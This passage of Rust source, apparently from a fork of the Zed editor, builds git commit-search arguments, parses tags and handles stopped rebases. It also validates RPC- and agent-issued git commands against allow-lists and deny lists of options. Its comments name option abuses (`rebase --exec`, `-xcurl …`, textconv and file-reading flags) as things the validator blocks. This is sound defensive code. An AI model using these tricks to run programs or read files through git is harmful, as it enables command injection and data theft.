    /// Whether the tagged commits are the whole answer, which the graph can give without git.
    pub fn is_only_commit_set(&self) -> bool {
        self.commits.is_some()
            && SearchCommitArgs {
                commits: None,
                case_sensitive: false,
                ..self.clone()
            } == SearchCommitArgs::default()
    }
}

pub fn commit_hash_search_query(query: &str) -> Option<&str> {
    let query = query.trim();
    (SHORT_SHA_LENGTH..=SHA256_HEX_LENGTH)
        .contains(&query.len())
        .then_some(query)
        .filter(|query| query.bytes().all(|byte| byte.is_ascii_hexdigit()))
}

/// The sha prefix a search narrows to: its `sha:` condition, or else a query that is nothing but
/// 7 to 40 hex digits.
fn search_hash_prefix(search_args: &SearchCommitArgs) -> Option<String> {
    search_args
        .sha_prefix
        .as_deref()
        .or_else(|| commit_hash_search_query(search_args.query.as_str()))
        .map(str::to_ascii_lowercase)
}

/// A date for `--since` / `--until`, spelled out in full so that git's date parser has nothing
/// to guess. Before the epoch is the epoch, git's own floor.
fn format_search_date(timestamp: i64) -> Result<String> {
    let datetime = OffsetDateTime::from_unix_timestamp(timestamp.max(0))?;
    Ok(datetime.format(time::macros::format_description!(
        "[year]-[month]-[day] [hour]:[minute]:[second] +0000"
    ))?)
}

/// The pathspec of a `ファイル:` condition: taken literally, unless it holds a `*`, which makes it
/// a glob. A glob with no `/` matches at any depth, as in `.gitignore`.
fn search_pathspec(path: &str) -> Result<String> {
    let Some(path) = commit_search::normalize_search_path(path) else {
        bail!(i18n::t!(
            "The file filter \"{path}\" names the whole repository, so it does not narrow the search."
        ));
    };
    Ok(if !path.contains('*') {
        format!(":(literal){path}")
    } else if path.contains('/') {
        format!(":(glob){path}")
    } else {
        format!(":(glob)**/{path}")
    })
}

/// What `git log` is given for a commit search after `log` and the format, `revisions` being the
/// commits to walk. `None` when there is nothing to match on, which finds nothing rather than
/// every commit.
fn commit_search_log_args(
    search_args: &SearchCommitArgs,
    revisions: Vec<String>,
    version: Option<GitVersion>,
) -> Result<Option<Vec<String>>> {
    search_args.validate()?;
    if !search_args.has_anything_to_match() {
        return Ok(None);
    }
    let authors = search_args.author_filters()?;
    let message_query = Some(search_args.query.trim())
        .filter(|query| !query.is_empty())
        .filter(|_| {
            search_args.sha_prefix.is_some()
                || commit_hash_search_query(search_args.query.as_str()).is_none()
        });

    let mut args = Vec::new();
    if !authors.is_empty() || message_query.is_some() {
        // `--fixed-strings` and `--regexp-ignore-case` cover `--author` as well as `--grep`,
        // which is what makes an author filter a substring match.
        args.push("--fixed-strings".to_string());
        if !search_args.case_sensitive {
            args.push("--regexp-ignore-case".to_string());
        }
        // Several `--author`s are ored by git; `search_commits` ands them afterwards.
        args.extend(authors.iter().map(|author| format!("--author={author}")));
        if let Some(message_query) = message_query {
            args.push(format!("--grep={message_query}"));
        }
    }
    if let Some(change) = search_args.change.as_deref() {
        GitFeature::PickaxeRegex
            .require(version, i18n::tc!("git result", "Search by changed text"))?;
        args.push(format!(
            "-G{}",
            commit_search::change_search_pattern(change, search_args.case_sensitive)
        ));
    }
    if let Some(since) = search_args.since {
        args.push(format!("--since={}", format_search_date(since)?));
    }
    if let Some(until) = search_args.until {
        args.push(format!("--until={}", format_search_date(until)?));
    }
    match search_args.merges {
        MergeFilter::Include => {}
        MergeFilter::Exclude => args.push("--no-merges".to_string()),
        MergeFilter::Only => args.push("--merges".to_string()),
    }
    // A file's history names its path after `--`. The other sources end their revisions with a
    // bare `--` (so that a branch named like a path is not read as one), which is dropped here and
    // put back once, before the pathspec when there is one.
    let terminator = revisions.iter().position(|revision| revision == "--");
    let has_pathspec = terminator.is_some_and(|index| index + 1 < revisions.len());
    let mut revisions = revisions;
    if !has_pathspec && let Some(index) = terminator {
        revisions.truncate(index);
    }
    if let Some(path) = search_args.path.as_deref() {
        anyhow::ensure!(
            !has_pathspec,
            i18n::t!(
                "\"{prefix}:\" cannot be used in a file's history.",
                prefix = commit_search::CommitSearchConditionKind::Path.query_prefix()
            )
        );
        GitFeature::PathspecMagic.require(version, i18n::tc!("git result", "Filter by file"))?;
        args.extend(revisions);
        args.push("--".to_string());
        args.push(search_pathspec(path)?);
    } else {
        args.extend(revisions);
        if !has_pathspec {
            args.push("--".to_string());
        }
    }
    Ok(Some(args))
}

/// The revisions a `ブランチ:` search walks: the branch less what the default branch has, or the
/// whole branch when it is the default one. `existing_refs` are the full refs that exist among
/// the branch and the candidates for the default branch.
fn branch_search_revisions(
    branch: &str,
    default_branch: Option<&str>,
    existing_refs: &HashSet<String>,
) -> Result<Vec<String>> {
    let short_name = branch
        .strip_prefix("refs/heads/")
        .or_else(|| branch.strip_prefix("refs/remotes/"))
        .unwrap_or(branch);
    anyhow::ensure!(
        commit_search::is_searchable_branch_ref(branch) && existing_refs.contains(branch),
        i18n::t!("There is no branch \"{branch}\".", branch = short_name)
    );
    let default_ref = default_branch.and_then(|default_branch| {
        [
            format!("refs/heads/{default_branch}"),
            format!("refs/remotes/{default_branch}"),
        ]
        .into_iter()
        .find(|candidate| {
            existing_refs.contains(candidate) && commit_search::is_searchable_branch_ref(candidate)
        })
    });
    let Some(default_ref) = default_ref else {
        bail!(i18n::t!(
            "The default branch was not found, so \"{prefix}:\" cannot narrow the search.",
            prefix = commit_search::CommitSearchConditionKind::Branch.query_prefix()
        ));
    };
    // A local `main` whose default is `origin/main` is the default branch too.
    let default_local_name = default_ref.strip_prefix("refs/heads/").or_else(|| {
        default_ref
            .strip_prefix("refs/remotes/")
            .and_then(|remote_branch| remote_branch.split_once('/'))
            .map(|(_, name)| name)
    });
    if branch == default_ref || branch.strip_prefix("refs/heads/") == default_local_name {
        Ok(vec![branch.to_string()])
    } else {
        Ok(vec![branch.to_string(), "--not".to_string(), default_ref])
    }
}

pub fn delete_branch_flag(is_remote_tracking_ref: bool, force: bool) -> &'static str {
    match (is_remote_tracking_ref, force) {
        (true, true) => "-Dr",
        (true, false) => "-dr",
        (false, true) => "-D",
        (false, false) => "-d",
    }
}

/// Raw result of [`GitRepository::run_command`].
///
/// A non-zero exit status is deliberately *not* an error: `git merge` reports
/// conflicts and `git apply` reports rejected hunks that way, and the caller
/// needs their stdout/stderr to tell the user what actually happened.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct GitCommandOutput {
    pub stdout: String,
    pub stderr: String,
    /// `None` when the process was terminated by a signal.
    pub exit_code: Option<i32>,
}

impl GitCommandOutput {
    pub fn succeeded(&self) -> bool {
        self.exit_code == Some(0)
    }

    /// Human-readable reason a command failed. stderr comes first because git
    /// puts its diagnostics there, and notification toasts only show the head
    /// of the text.
    pub fn failure_message(&self) -> String {
        let mut message = String::new();
        for part in [self.stderr.trim(), self.stdout.trim()] {
            if part.is_empty() {
                continue;
            }
            if !message.is_empty() {
                message.push('\n');
            }
            message.push_str(part);
        }
        if !message.is_empty() {
            return message;
        }
        match self.exit_code {
            Some(code) => i18n::t!("git exited with status {code}."),
            None => i18n::t!("git terminated abnormally.").to_string(),
        }
    }
}

/// Subcommands that [`GitRepository::run_command`] accepts.
///
/// `run_command` is reachable from the remote-project RPC, and git treats
/// leading `-c key=value` / `--exec-path=…` arguments as configuration
/// (`core.pager`, `core.sshCommand`, aliases, …) from which it will happily
/// launch an arbitrary program. Pinning the first argument to a known
/// subcommand keeps this one escape hatch limited to the operations the git
/// panel actually needs.
pub const ALLOWED_GIT_COMMANDS: &[&str] = &[
    "add",
    "apply",
    "branch",
    "checkout",
    "cherry-pick",
    "commit",
    "commit-tree",
    "describe",
    "diff",
    "for-each-ref",
    "format-patch",
    "log",
    "ls-files",
    "merge",
    "pack-refs",
    "rebase",
    "reset",
    "rev-parse",
    "revert",
    "show",
    "switch",
    "tag",
];

/// Environment variables [`GitRepository::run_command`] accepts from its caller.
///
/// The environment is attacker-shaped input for the same reason the arguments are: `GIT_EDITOR`,
/// `GIT_SEQUENCE_EDITOR`, `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF` and friends all name a program
/// git will run. Only the three variables `commit-tree` reads to keep a rewritten commit's
/// original author get through.
pub const ALLOWED_GIT_COMMAND_ENV: &[&str] =
    &["GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_AUTHOR_DATE"];

/// The key a client puts in a remote `GitRunCommand`'s `env` to have the host run the command
/// with [`GitRepository::run_command_without_hooks`] (ADR-F90). The host takes it out before git
/// sees the environment.
///
/// It is a key of the environment rather than a field of its own so that it fails closed: a host
/// from before it reads no such field and would run the command with hooks, but it refuses an
/// environment variable outside [`ALLOWED_GIT_COMMAND_ENV`] before running anything.
pub const GIT_COMMAND_WITHOUT_HOOKS_ENV_KEY: &str = "ZED_GIT_COMMAND_WITHOUT_HOOKS";

/// Subcommands of [`ALLOWED_GIT_COMMANDS`] that run repository hooks, so that an untrusted project
/// on a git too old to disable them gets an error instead (ADR-F47).
pub const HOOK_RUNNING_GIT_COMMANDS: &[&str] = &[
    "checkout",
    "cherry-pick",
    "commit",
    "merge",
    "rebase",
    "revert",
    "switch",
];

/// The name of a [`HOOK_RUNNING_GIT_COMMANDS`] operation for that error.
fn hook_running_operation_name(subcommand: &str) -> Option<&'static str> {
    Some(match subcommand {
        "checkout" => i18n::tc!("git result", "Checkout"),
        "cherry-pick" => i18n::tc!("git result", "Cherry-pick"),
        "commit" => i18n::tc!("git result", "Commit"),
        "merge" => i18n::tc!("git result", "Merge"),
        "rebase" => i18n::tc!("git result", "Rebase"),
        "revert" => i18n::tc!("git result", "Revert"),
        "switch" => i18n::tc!("git result", "Switch branch"),
        _ => return None,
    })
}

/// Options [`validate_git_command`] refuses wherever they appear.
///
/// Pinning the first argument to a subcommand is not enough on its own, because several of the
/// subcommands above take an option that reaches outside the repository: `rebase --exec <cmd>`
/// runs a program of the caller's choosing between commits, `--output=<path>` writes git's output
/// over any file the host user can write, `--file=<path>` reads any file the host user can read
/// into a message the caller can print back with `log`, `--ext-diff` and `--textconv` hand the
/// repository's own configuration a program to run, and `--help` does the same through `help.*`.
/// `--pathspec-from-file=<path>` (`add`, `commit`, `reset`, `checkout`) reads any file the host
/// user can read and echoes each line back in the "did not match any files" error.
/// `diff --no-index` prints any two files the host user can read, and `apply --unsafe-paths`
/// writes the caller's patch (`run_command` takes stdin) outside the working tree.
/// `ls-files --exclude-from=<path>` (`-X`) reads any file the host user can read as ignore
/// patterns, and `--exclude-per-directory=<name>` reads the file of that name from every
/// directory, `..` included, so the files it lists give away what those files say.
/// No wrapper in this fork needs any of them, and `run_command` is reachable over RPC.
const REFUSED_GIT_LONG_OPTIONS: &[&str] = &[
    "--exec",
    "--exec-path",
    "--exclude-from",
    "--exclude-per-directory",
    "--ext-diff",
    "--file",
    "--help",
    "--no-index",
    "--output",
    "--output-directory",
    "--pathspec-from-file",
    "--textconv",
    "--unsafe-paths",
];

/// The short spellings of [`REFUSED_GIT_LONG_OPTIONS`]: `-x` is `rebase --exec`, `-F` is
/// `--file`, `-o` is `format-patch --output-directory` and `-X` is `ls-files --exclude-from`. Each can carry its value attached
/// (`-xcurl …`) or sit in a bundle of flags (`-nx`). `cherry-pick -x`, which only appends a line
/// to the message, and `commit -o` (`--only`) go with them; nothing here needs them.
const REFUSED_GIT_SHORT_OPTIONS: &[char] = &['x', 'F', 'o', 'X'];

/// Subcommands whose `-m` / `--message` reads the next argument as free text.
///
/// git never parses that argument as an option however it is spelled, so neither does
/// [`validate_git_command`]: a commit message may perfectly well start with `-`. Subcommands
/// where `-m` is a flag instead (`rebase --merge`, `log -m`, …) are deliberately absent, so that
/// a caller cannot hide `-x` behind one.
const MESSAGE_TAKING_GIT_COMMANDS: &[&str] = &[
    "cherry-pick",
    "commit",
    "commit-tree",
    "merge",
    "revert",
    "tag",
];

/// Rejects a command whose first argument is not one of [`ALLOWED_GIT_COMMANDS`], or that carries
/// one of [`REFUSED_GIT_LONG_OPTIONS`], handing back the subcommand when it is allowed.
///
/// Every [`GitRepository::run_command`] implementation calls this, so that a wrapper building a
/// command nobody allowed fails the same way against the fake repository as against a real one.
pub fn validate_git_command(args: &[String]) -> Result<&str> {
    let subcommand = args.first().context("no git subcommand given")?.as_str();
    anyhow::ensure!(
        ALLOWED_GIT_COMMANDS.contains(&subcommand),
        "unsupported git command: {subcommand}"
    );
    let takes_message = MESSAGE_TAKING_GIT_COMMANDS.contains(&subcommand);
    let mut argument_is_message = false;
    for argument in args.iter().skip(1) {
        if std::mem::take(&mut argument_is_message) {
            continue;
        }
        if takes_message && (argument == "-m" || argument == "--message") {
            argument_is_message = true;
            continue;
        }
        anyhow::ensure!(
            !is_refused_git_argument(argument)
                && !(subcommand == "diff" && names_a_path_outside_the_repository(argument)),
            "unsupported git command argument: {argument}"
        );
    }
    Ok(subcommand)
}

/// Subcommands of [`ALLOWED_GIT_COMMANDS`] that the git panel needs but an AI agent does not:
/// plumbing that writes objects and packs refs.
const AGENT_REFUSED_GIT_COMMANDS: &[&str] = &["commit-tree", "pack-refs"];

/// Subcommands whose `-s` is `--strategy`, which names a `git-merge-<strategy>` program to run.
const SHORT_STRATEGY_GIT_COMMANDS: &[&str] = &["merge", "rebase"];

/// Subcommands that take `--strategy`.
const STRATEGY_TAKING_GIT_COMMANDS: &[&str] = &["cherry-pick", "merge", "rebase", "revert"];

/// Subcommands whose `-p` / `--patch` picks hunks interactively: it waits for answers on a
/// terminal the agent's git has not got, and shows the hunks through the repository's own diff
/// configuration. `add -i` / `--interactive` and `add -e` / `--edit` (an editor) go with them.
const PATCH_MODE_GIT_COMMANDS: &[&str] = &["add", "checkout", "commit", "reset", "restore"];

/// [`validate_git_command`], narrowed further for a command an AI agent asked for (ADR-F90),
/// handing back the subcommand.
///
/// On top of what any caller is refused, an agent may not run the plumbing in
/// [`AGENT_REFUSED_GIT_COMMANDS`], go into submodules (`--recurse-submodules`), whose own
/// configuration Zed does not look at for every command, or pick a merge strategy, which git runs
/// as a program found by name, have `apply --build-fake-ancestor` write an index file over any
/// path outside the sandbox, or pick hunks interactively ([`PATCH_MODE_GIT_COMMANDS`]). Nothing
/// on [`ALLOWED_GIT_COMMANDS`] reaches the network.
pub fn validate_agent_git_command(args: &[String]) -> Result<&str> {
    let subcommand = validate_git_command(args)?;
    anyhow::ensure!(
        !AGENT_REFUSED_GIT_COMMANDS.contains(&subcommand),
        "unsupported git command: {subcommand}"
    );
    let takes_strategy = STRATEGY_TAKING_GIT_COMMANDS.contains(&subcommand);
    let short_strategy = SHORT_STRATEGY_GIT_COMMANDS.contains(&subcommand);
    let patch_mode = PATCH_MODE_GIT_COMMANDS.contains(&subcommand);
    // Every argument is looked at, the value of `-m` and whatever follows `--` included: an option
    // that takes a value (`merge -X`, `commit --trailer`, `checkout -b`) takes `-m` or `--` as that
    // value, and git then reads the argument after it as an option (`merge -X -m -s <strategy>`,
    // `commit --trailer -m --file=<path>`). A message or a path that starts with `-` is refused
    // with them.
    for argument in args.iter().skip(1) {
        anyhow::ensure!(
            !is_refused_git_argument(argument),
            "unsupported git command argument: {argument}"
        );
        let refused = if let Some(long_option) = argument.strip_prefix("--") {
            let name = long_option
                .split_once('=')
                .map_or(long_option, |(name, _)| name);
            // Any unambiguous prefix of a long option is that option to git.
            let is_prefix_of = |option: &str| !name.is_empty() && option.starts_with(name);
            is_prefix_of("recurse-submodules")
                || name.starts_with("recurse-submodules")
                || (takes_strategy && is_prefix_of("strategy"))
                || (subcommand == "apply" && is_prefix_of("build-fake-ancestor"))
                || (patch_mode && is_prefix_of("patch"))
                || (matches!(subcommand, "add" | "commit") && is_prefix_of("interactive"))
                || (subcommand == "add" && is_prefix_of("edit"))
        } else if let Some(short_options) = argument.strip_prefix('-') {
            short_options
                .chars()
                .take_while(|letter| letter.is_ascii_alphabetic())
                .any(|letter| {
                    (short_strategy && letter == 's')
                        || (patch_mode && letter == 'p')
                        || (subcommand == "add" && matches!(letter, 'i' | 'e'))
                })
        } else {
            false
        };
        anyhow::ensure!(!refused, "unsupported git command argument: {argument}");
    }
    if subcommand == "commit" {
        ensure_agent_commit_opens_no_editor(args)?;
    }
    Ok(subcommand)
}

/// A commit that prepares a message for an editor writes the staged diff into it when asked
/// (`-v`, or `commit.verbose` in the repository's own configuration), and that diff runs the
/// `diff.<driver>.textconv` program the repository's configuration names. A repository nested in
/// the project can have been created, configuration and all, by the agent from its sandbox, so an
/// agent's commit must give its message on the command line and never ask for the editor
/// (`-e`, `-c` / `--reedit-message`, or `-t` / `--template`, which also reads any file).
fn ensure_agent_commit_opens_no_editor(args: &[String]) -> Result<()> {
    let mut has_message = false;
    // Every argument, as in [`validate_agent_git_command`].
    for argument in args.iter().skip(1) {
        let refused = if let Some(long_option) = argument.strip_prefix("--") {
            let name = long_option
                .split_once('=')
                .map_or(long_option, |(name, _)| name);
            if name == "message" {
                has_message = true;
            }
            // `--e` is `--edit` to git.
            let is_prefix_of = |option: &str| !name.is_empty() && option.starts_with(name);
            is_prefix_of("verbose")
                || is_prefix_of("edit")
                || is_prefix_of("reedit-message")
                || is_prefix_of("template")
        } else if let Some(short_options) = argument.strip_prefix('-') {
            let letters = short_options
                .chars()
                .take_while(|letter| letter.is_ascii_alphabetic())
                .collect::<Vec<_>>();
            if letters.contains(&'m') {
                has_message = true;
            }
            // Up to `m`, whose value is the rest of the argument.
            letters
                .iter()
                .take_while(|letter| **letter != 'm')
                .any(|letter| matches!(letter, 'v' | 'e' | 'c' | 't'))
        } else {
            false
        };
        anyhow::ensure!(!refused, "unsupported git command argument: {argument}");
    }
    anyhow::ensure!(
        has_message,
        "an agent's git commit must give its message with -m"
    );
    Ok(())
}

/// Whether `message` is [`validate_git_command`] refusing `subcommand` itself, which is how a remote
/// Zed from before `subcommand` joined [`ALLOWED_GIT_COMMANDS`] answers a newer client.
pub fn is_unknown_git_subcommand_refusal(message: &str, subcommand: &str) -> bool {
    let refusal = format!("unsupported git command: {subcommand}");
    message.match_indices(&refusal).any(|(index, _)| {
        message.get(index + refusal.len()..).is_some_and(|rest| {
            !rest.starts_with(|character: char| {
                character.is_ascii_alphanumeric() || character == '-'
            })
        })
    })
}

/// Whether `argument` could be a path outside the working tree: given two paths of which one is
/// outside, `diff` compares the files themselves as `--no-index` would, without being asked to,
/// and prints any file the host user can read. Absolute paths (`/…`, `\…`, `C:…`, UNC), `~…`, and
/// anything with a `..` path component are refused; a revision range (`a..b`, `a...b`) has no
/// separator around its dots and stays allowed.
fn names_a_path_outside_the_repository(argument: &str) -> bool {
    let mut characters = argument.chars();
    let absolute = match (characters.next(), characters.next()) {
        (Some('/' | '\\' | '~'), _) => true,
        (Some(drive), Some(':')) => drive.is_ascii_alphabetic(),
        _ => false,
    };
    absolute
        || argument
            .split(['/', '\\'])
            .any(|component| component == "..")
}

fn is_refused_git_argument(argument: &str) -> bool {
    if let Some(long_option) = argument.strip_prefix("--") {
        let (name, value) = long_option
            .split_once('=')
            .map_or((long_option, None), |(name, value)| (name, Some(value)));
        // `--submodule=diff` runs `git diff` inside each submodule, which runs the submodule's own
        // textconv programs whatever `--no-textconv` says.
        if !name.is_empty() && "submodule".starts_with(name) && value == Some("diff") {
            return true;
        }
        // git takes any unambiguous prefix of a long option for the option itself (`rebase --exe
        // <cmd>`, `add --pathspec-from=<path>`), so a prefix is refused as well. `--text` is the
        // one real option (`diff -a`) that is also a prefix of a refused one, and git reads an
        // exact name as that option rather than as an abbreviation.
        return !name.is_empty()
            && name != "text"
            && REFUSED_GIT_LONG_OPTIONS.iter().any(|refused| {
                refused
                    .strip_prefix("--")
                    .is_some_and(|refused| refused.starts_with(name))
            });
    }
    let Some(short_options) = argument.strip_prefix('-') else {
        return false;
    };
    // A bundle of flags (`-nx`), in which git reads whatever follows an option that takes a value
    // as that value (`-xcurl …`, `-ix"sh …"`, `-ko/tmp`), so any refused letter up to the first
    // character that cannot be a flag may be the option that gets it. Something starting with a
    // digit or a space is a value git will not read as an option, such as a negative number.
    short_options
        .chars()
        .take_while(|letter| letter.is_ascii_alphabetic())
        .any(|letter| REFUSED_GIT_SHORT_OPTIONS.contains(&letter))
}

/// Rejects caller-supplied environment variables outside [`ALLOWED_GIT_COMMAND_ENV`].
pub fn validate_git_command_env(command_env: &HashMap<String, String>) -> Result<()> {
    for name in command_env.keys() {
        anyhow::ensure!(
            ALLOWED_GIT_COMMAND_ENV.contains(&name.as_str()),
            "unsupported git command environment variable: {name}"
        );
    }
    Ok(())
}

/// A tag, as `Repository::tags` reads it back from `for-each-ref`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TagInfo {
    /// Short name, with `refs/tags/` stripped.
    pub name: String,
    /// The commit the tag points at; for an annotated tag this is the peeled commit rather than
    /// the tag object.
    pub commit_sha: String,
    pub created_at_unix: Option<i64>,
    /// First line of an annotated tag's message.
    pub subject: Option<String>,
    /// First line of the tagged commit's message, for a lightweight tag, which has no message
    /// of its own.
    pub commit_subject: Option<String>,
    pub annotated: bool,
}

/// The `--format` `Repository::tags` hands to `for-each-ref`.
///
/// `%(refname)` rather than `%(refname:short)`: shortening checks every tag name for ambiguity
/// against the other refs, several file lookups per tag, which took seconds on a repository with
/// tens of thousands of tags. [`TagInfo::rev`] is what disambiguates a tag instead.
///
/// `%(creatordate:raw)` rather than `:unix`, which git only learned in 2.9.4 (ADR-F47); the raw
/// form has printed `<seconds> <offset>` since long before that.
pub const TAG_LIST_FORMAT: &str = "%(refname)%00%(objecttype)%00%(objectname)%00%(*objectname)%00%(creatordate:raw)%00%(contents:subject)";

const TAG_REF_PREFIX: &str = "refs/tags/";

impl TagInfo {
    /// Parses `for-each-ref` output produced with [`TAG_LIST_FORMAT`].
    pub fn parse_list(stdout: &str) -> Vec<TagInfo> {
        stdout.lines().filter_map(Self::parse_line).collect()
    }

    /// The full ref name, for passing the tag to git as a revision: a branch of the same name
    /// would win over the bare tag name in some commands and be ambiguous in the others.
    pub fn rev(&self) -> String {
        format!("{TAG_REF_PREFIX}{}", self.name)
    }

    fn parse_line(line: &str) -> Option<TagInfo> {
        let mut fields = line.trim_end_matches('\r').split('\0');
        let name = fields.next()?.strip_prefix(TAG_REF_PREFIX)?;
        let object_type = fields.next()?;
        let object_sha = fields.next()?;
        let peeled_sha = fields.next()?;
        let created_at = fields.next().unwrap_or_default();
        let subject = fields.next().unwrap_or_default();
        if name.is_empty() || object_sha.is_empty() {
            return None;
        }
        let annotated = object_type == "tag";
        let commit_sha = if peeled_sha.is_empty() {
            object_sha
        } else {
            peeled_sha
        };
        let subject = (!subject.is_empty()).then(|| subject.to_owned());
        Some(TagInfo {
            name: name.to_owned(),
            commit_sha: commit_sha.to_owned(),
            created_at_unix: created_at
                .split_whitespace()
                .next()
                .and_then(|seconds| seconds.parse().ok()),
            subject: subject.clone().filter(|_| annotated),
            commit_subject: subject.filter(|_| !annotated && object_type == "commit"),
            annotated,
        })
    }
}

/// How far a commit sits past the nearest tag, from `git describe --tags --long`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TagDistance {
    pub tag: String,
    /// `0` when the commit itself carries the tag.
    pub commits_since: u32,
    pub short_sha: String,
}

impl TagDistance {
    /// Parses `v1.2.3-5-gabcdef`. A tag name may contain `-` itself, so the count and the
    /// abbreviated sha are taken from the right.
    pub fn parse(described: &str) -> Option<TagDistance> {
        let (rest, abbreviated) = described.trim().rsplit_once('-')?;
        let short_sha = abbreviated.strip_prefix('g')?;
        let (tag, commits_since) = rest.rsplit_once('-')?;
        if tag.is_empty() || short_sha.is_empty() {
            return None;
        }
        Some(TagDistance {
            tag: tag.to_owned(),
            commits_since: commits_since.parse().ok()?,
            short_sha: short_sha.to_owned(),
        })
    }
}

/// The three operations that can stop part-way and leave the repository waiting for the user.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SequencerKind {
    CherryPick,
    Revert,
    Rebase,
}

impl SequencerKind {
    /// The subcommand whose `--continue` / `--skip` / `--abort` drives this operation.
    pub fn subcommand(self) -> &'static str {
        match self {
            Self::CherryPick => "cherry-pick",
            Self::Revert => "revert",
            Self::Rebase => "rebase",
        }
    }

    /// The pseudo-ref git keeps while the operation is stopped.
    ///
    /// `REBASE_HEAD` only exists from git 2.13, so on an older git a stopped rebase leaves none of
    /// these behind; [`sequencer_state_from_probes`] falls back to the leftover conflicts rather
    /// than reporting it wrongly as a cherry-pick.
    pub fn in_progress_ref(self) -> &'static str {
        match self {
            Self::CherryPick => "CHERRY_PICK_HEAD",
            Self::Revert => "REVERT_HEAD",
            Self::Rebase => "REBASE_HEAD",
        }
    }

    /// Name shown to the user, in the git panel's banner and in error messages.
    pub fn label(self) -> &'static str {
        match self {
            Self::CherryPick => i18n::tc!("git sequencer", "cherry-pick"),
            Self::Revert => i18n::tc!("git sequencer", "revert"),
            Self::Rebase => i18n::tc!("git sequencer", "rebase"),
        }
    }

    /// The order `Repository::sequencer_state` probes these in.
    ///
    /// Rebase comes first because a rebase that stops on a conflict also leaves `CHERRY_PICK_HEAD`
    /// behind (its picks go through the same sequencer), and reporting it as a cherry-pick would
    /// offer the user `git cherry-pick --continue`, which cannot finish a rebase.
    pub fn all() -> [SequencerKind; 3] {
        [Self::Rebase, Self::CherryPick, Self::Revert]
    }
}

/// A `cherry-pick` / `revert` / `rebase` that stopped part-way.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SequencerState {
    pub kind: SequencerKind,
    /// The index still has unmerged paths.
    pub conflicted: bool,
    /// `false` when nothing was found to say so outright and this is only what the leftover
    /// conflicts suggest, which is all an older git allows (see [`uncertain_rebase_message`]).
    pub certain: bool,
}

/// What one round of the probes behind [`sequencer_state_from_probes`] found.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct SequencerProbes {
    /// The kind whose [`SequencerKind::in_progress_ref`] exists, if any.
    pub in_progress: Option<SequencerKind>,
    /// The index has unmerged paths.
    pub unmerged_paths: bool,
    /// `MERGE_HEAD` exists, so an ordinary `git merge` owns those unmerged paths.
    pub merge_in_progress: bool,
    /// `HEAD` is detached, which every version of git does for the length of a rebase.
    pub head_is_detached: bool,
}

/// Turns a round of probes into what the git panel shows.
///
/// The fallback in the last arm is there because `REBASE_HEAD` only exists from the version
/// [`uncertain_rebase_message`] names: on an older git a rebase stopped on a conflict leaves no
/// ref any of the probes can find, and reporting "nothing in progress" would leave the user with
/// no way out of it.
///
/// A detached `HEAD` is what keeps that arm from swallowing every other way to end up with
/// conflicts and no ref: `git stash pop`, `git apply --3way`, `git am`, `git merge --squash`,
/// `git cherry-pick -n` and `git checkout -m` all leave them behind while sitting on a branch,
/// whereas a rebase detaches `HEAD` for as long as it runs. It is a strong hint rather than a
/// fact, though — the same conflicts on a detached `HEAD` reached some other way land here too —
/// so the state is marked uncertain rather than acted on.
pub fn sequencer_state_from_probes(probes: SequencerProbes) -> Option<SequencerState> {
    match probes {
        SequencerProbes {
            in_progress: Some(kind),
            unmerged_paths,
            ..
        } => Some(SequencerState {
            kind,
            conflicted: unmerged_paths,
            certain: true,
        }),
        SequencerProbes {
            in_progress: None,
            unmerged_paths: true,
            merge_in_progress: false,
            head_is_detached: true,
        } => Some(SequencerState {
            kind: SequencerKind::Rebase,
            conflicted: true,
            certain: false,
        }),
        _ => None,
    }
}

/// What the git panel says about a [`SequencerState`] with `certain: false`.
///
/// The version is where git started writing `REBASE_HEAD`, which is the only thing that tells a
/// stopped rebase apart from leftover conflicts.
pub fn uncertain_rebase_message() -> String {
    let since = GitFeature::RebaseHeadRef.minimum_version();
    i18n::t!(
        "A rebase may have stopped partway (git before {major}.{minor} cannot tell for sure)",
        major = since.major,
        minor = since.minor
    )
}

/// What [`GitRepository::run_command`] has to change about a caller's arguments so that an older
/// git does the same thing (ADR-F47).
///
/// The substitution happens where git runs rather than where the arguments are built: a remote
/// project's client only reaches the host's git through `run_command` and cannot see its version.
#[derive(Clone, Debug, PartialEq, Eq)]
struct AdaptedGitCommand {
    args: Vec<String>,
    /// `--autostash` was dropped because this git predates it, so the rebase now needs a clean
    /// worktree.
    dropped_autostash: bool,
}

fn adapt_command_to_git_version(
    args: Vec<String>,
    version: Option<GitVersion>,
) -> AdaptedGitCommand {
    let mut dropped_autostash = false;
    let args = match args.first().map(String::as_str) {
        Some("switch") if !GitFeature::SwitchAndRestore.is_supported_by(version) => args
            .into_iter()
            .enumerate()
            .map(|(index, argument)| match (index, argument.as_str()) {
                (0, _) => "checkout".to_string(),
                (_, "-c") => "-b".to_string(),
                (_, "-C") => "-B".to_string(),
                _ => argument,
            })
            .collect(),
        Some("rebase") if !GitFeature::RebaseAutostash.is_supported_by(version) => {
            let mut kept = Vec::with_capacity(args.len());
            for argument in args {
                if argument == "--autostash" {
                    dropped_autostash = true;
                } else {
                    kept.push(argument);
                }
            }
            kept
        }
        _ => args,
    };
    AdaptedGitCommand {
        args,
        dropped_autostash,
    }
}

/// Refuses, with the ADR-F47 wording, a command an older git would only answer with a usage
/// error.
///
/// `cherry-pick --skip` / `revert --skip` (git 2.22) is the git panel banner's "skip" button;
/// `rebase --skip`, `--continue` and `--abort` are far older than any version this fork supports,
/// and there is no way to skip a pick on an older git that does not risk the user's work
/// (`reset --hard` + `--continue` throws away whatever they had resolved), so the button says so
/// instead of guessing.
fn ensure_arguments_are_supported(
    subcommand: &str,
    args: &[String],
    version: Option<GitVersion>,
) -> Result<()> {
    if matches!(subcommand, "cherry-pick" | "revert")
        && args.iter().any(|argument| argument == "--skip")
    {
        GitFeature::SequencerSkip.require(version, i18n::tc!("git result", "Skip this commit"))?;
    }
    Ok(())
}

/// What a patch file created from the git panel should contain.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum PatchSource {
    /// Unstaged changes in the working tree (`git diff`).
    Worktree,
    /// Staged changes (`git diff --cached`).
    Index,
    /// The most recent commit, as a mailbox-format patch (`git format-patch -1 HEAD`).
    HeadCommit,
}

impl PatchSource {
